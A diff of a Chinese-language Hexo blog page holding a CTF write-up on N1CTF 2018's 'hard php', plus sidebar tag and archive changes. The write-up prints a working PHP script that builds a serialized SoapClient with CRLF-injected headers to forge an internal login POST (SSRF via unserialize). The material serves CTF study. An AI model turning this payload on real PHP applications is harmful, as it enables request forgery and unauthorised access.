@@ -263,6 +263,10 @@ height:50vh;
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "serialize">serialize</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ssrf">ssrf</a>
+    
 </div>
                 
                 
@@ -432,7 +436,7 @@ height:50vh;
 <h3 id="Magic-Method-call"><a href="#Magic-Method-call" class="headerlink" title="Magic Method call()"></a>Magic Method call()</h3><p>这个trick来自于刚结束的N1CTF的hard php<br>题目需要使用ssrf，但是整个题目就只有2个漏洞点:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.sql注入</span><br><span class="line">2.伪造任意的php内置类</span><br></pre></td></tr></table></figure></p>
 <p>sql注入显然在这道题里只是用来获取管理员密码的，与SSRF无关<br>那么看来SSRF就是在伪造任意的php内置类了<br>题目中可控并且可进行反序列化的类为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mood</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mood, $ip, $date;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($mood, $ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mood = $mood;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip  = $ip;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;date = time();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getcountry</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ip = @file_get_contents(<span class="string">"http://ip.taobao.com/service/getIpInfo.php?ip="</span>.<span class="keyword">$this</span>-&gt;ip);</span><br><span class="line">        $ip = json_decode($ip,<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> $ip[<span class="string">'data'</span>][<span class="string">'country'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getsubtime</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $now_date = time();</span><br><span class="line">        $sub_date = (int)$now_date - (int)<span class="keyword">$this</span>-&gt;date;</span><br><span class="line">        $days = (int)($sub_date/<span class="number">86400</span>);</span><br><span class="line">        $hours = (int)($sub_date%<span class="number">86400</span>/<span class="number">3600</span>);</span><br><span class="line">        $minutes = (int)($sub_date%<span class="number">86400</span>%<span class="number">3600</span>/<span class="number">60</span>);</span><br><span class="line">        $res = ($days&gt;<span class="number">0</span>)?<span class="string">"$days days $hours hours $minutes minutes ago"</span>:(($hours&gt;<span class="number">0</span>)?<span class="string">"$hours hours $minutes minutes ago"</span>:<span class="string">"$minutes minutes ago"</span>);</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>经过上一个trick点，我们可以知道不可能存在某个同名函数getcountry()拥有ssrf的能力的<br>但此时，我们查阅相关手册可以发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public mixed __call ( string $name , array $arguments )</span><br></pre></td></tr></table></figure></p>
-<p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用<br>而此时我们可以发现php内置类：<code>SoapClient</code><br>这个类可以发送url请求，但是新的问题来了：<br>该类是用来发送xml的，发送的请求Content-type为Xml<br>我们如何才能让他伪造post数据包呢？<br>这里我们可以发现SoapClient的参数中有user_agent项<br>可以进行CRLF注入<br>所以最后我们可以构造soapclient对象<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/index.php?action=login"</span>; </span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                               <span class="string">'user_agent'</span> =&gt; <span class="string">"AAA:BBB\r\nContent‐Type: application/x‐www‐form-urlencoded\r\n"</span>.<span class="string">"Cookie:PHPSESSID=sessid\r\nContent‐Length:"</span>.<span class="string">"501\r\n\r\nusername=admin&amp;password=nu1ladmin&amp;code=985008&amp;"</span>,<span class="string">'uri'</span> =&gt; <span class="string">"skysec.top"</span>));   </span><br><span class="line">$payload = serialize($attack);   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">	$hex = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($string); $i++)</span><br><span class="line">		&#123;         </span><br><span class="line">			$ord = ord($string[$i]);        </span><br><span class="line">			 $hexCode = dechex($ord);         </span><br><span class="line">			$hex .= substr(<span class="string">'0'</span>.$hexCode, ‐<span class="number">2</span>);     </span><br><span class="line">		&#125; </span><br><span class="line">	<span class="keyword">return</span> $hex; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> strtoHex($payload);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用<br>而此时我们可以发现php内置类：<code>SoapClient</code><br>这个类可以发送url请求，但是新的问题来了：<br>该类是用来发送xml的，发送的请求Content-type为Xml<br>我们如何才能让他伪造post数据包呢？<br>这里我们可以发现SoapClient的参数中有user_agent项<br>可以进行CRLF注入<br>所以最后我们可以构造soapclient对象<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/index.php?action=login"</span>; </span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                               <span class="string">'user_agent'</span> =&gt; <span class="string">"AAA:BBB\r\nContent‐Type: application/x‐www‐form-urlencoded\r\n"</span>.<span class="string">"Cookie:PHPSESSID=sessid\r\nContent‐Length:"</span>.<span class="string">"501\r\n\r\nusername=admin&amp;password=nu1ladmin&amp;code=985008&amp;"</span>,<span class="string">'uri'</span> =&gt; <span class="string">"skysec.top"</span>));   </span><br><span class="line">$payload = serialize($attack);   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">	$hex = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($string); $i++)</span><br><span class="line">		&#123;         </span><br><span class="line">			$ord = ord($string[$i]);        </span><br><span class="line">			 $hexCode = dechex($ord);         </span><br><span class="line">			$hex .= substr(<span class="string">'0'</span>.$hexCode, ‐<span class="number">2</span>);     </span><br><span class="line">		&#125; </span><br><span class="line">	<span class="keyword">return</span> $hex; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> strtoHex($payload);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>由此题可见，倘若我们有可控的反序列化注入点，很有可能可以构造ssrf进行攻击！<br>另外此题已经开源，有兴趣的可以自行搭建:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</span><br></pre></td></tr></table></figure></p>
 
     </article>
@@ -585,6 +589,62 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -3877,22 +3937,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
@@ -3907,53 +3967,55 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
         <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="CRC"><span class="iconfont-archer">&#xe606;</span>CRC</span>
-    
-        <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
-    
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
+        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
     
         <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="hexo"><span class="iconfont-archer">&#xe606;</span>hexo</span>
+        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+    
+        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
         <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
     
-        <span class="sidebar-tag-name" data-tags="RSA"><span class="iconfont-archer">&#xe606;</span>RSA</span>
-    
-        <span class="sidebar-tag-name" data-tags="php_black_magic"><span class="iconfont-archer">&#xe606;</span>php_black_magic</span>
+        <span class="sidebar-tag-name" data-tags="其他"><span class="iconfont-archer">&#xe606;</span>其他</span>
     
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
+        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
+    
+        <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
+    
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
     
         <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
     
-        <span class="sidebar-tag-name" data-tags=".git"><span class="iconfont-archer">&#xe606;</span>.git</span>
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
-        <span class="sidebar-tag-name" data-tags="ShadowSocks"><span class="iconfont-archer">&#xe606;</span>ShadowSocks</span>
+        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
     
         <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="学业"><span class="iconfont-archer">&#xe606;</span>学业</span>
     
-        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
+        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
     
-        <span class="sidebar-tag-name" data-tags=".htaccess"><span class="iconfont-archer">&#xe606;</span>.htaccess</span>
+        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
     
-        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
     
-        <span class="sidebar-tag-name" data-tags="ECC"><span class="iconfont-archer">&#xe606;</span>ECC</span>
-    
-        <span class="sidebar-tag-name" data-tags="心情随笔"><span class="iconfont-archer">&#xe606;</span>心情随笔</span>
-    
-        <span class="sidebar-tag-name" data-tags="计网考试"><span class="iconfont-archer">&#xe606;</span>计网考试</span>
+        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
         <span class="sidebar-tag-name" data-tags="soap"><span class="iconfont-archer">&#xe606;</span>soap</span>
     
@@ -3961,23 +4023,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="writeup.crypto"><span class="iconfont-archer">&#xe606;</span>writeup.crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
     
-        <span class="sidebar-tag-name" data-tags="websummary"><span class="iconfont-archer">&#xe606;</span>websummary</span>
+        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
     
-        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机实验"><span class="iconfont-archer">&#xe606;</span>微机实验</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机考试"><span class="iconfont-archer">&#xe606;</span>微机考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="马原考试"><span class="iconfont-archer">&#xe606;</span>马原考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机实验考试"><span class="iconfont-archer">&#xe606;</span>微机实验考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="Algorithm"><span class="iconfont-archer">&#xe606;</span>Algorithm</span>
-    
-        <span class="sidebar-tag-name" data-tags="algorithm"><span class="iconfont-archer">&#xe606;</span>algorithm</span>
+        <span class="sidebar-tag-name" data-tags="des"><span class="iconfont-archer">&#xe606;</span>des</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -4032,9 +4082,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="awd"><span class="iconfont-archer">&#xe60a;</span>awd</span>
     
-        <span class="sidebar-category-name" data-categories="心情随笔"><span class="iconfont-archer">&#xe60a;</span>心情随笔</span>
-    
         <span class="sidebar-category-name" data-categories="计网考试"><span class="iconfont-archer">&#xe60a;</span>计网考试</span>
+    
+        <span class="sidebar-category-name" data-categories="心情随笔"><span class="iconfont-archer">&#xe60a;</span>心情随笔</span>
     
         <span class="sidebar-category-name" data-categories="flask"><span class="iconfont-archer">&#xe60a;</span>flask</span>
     
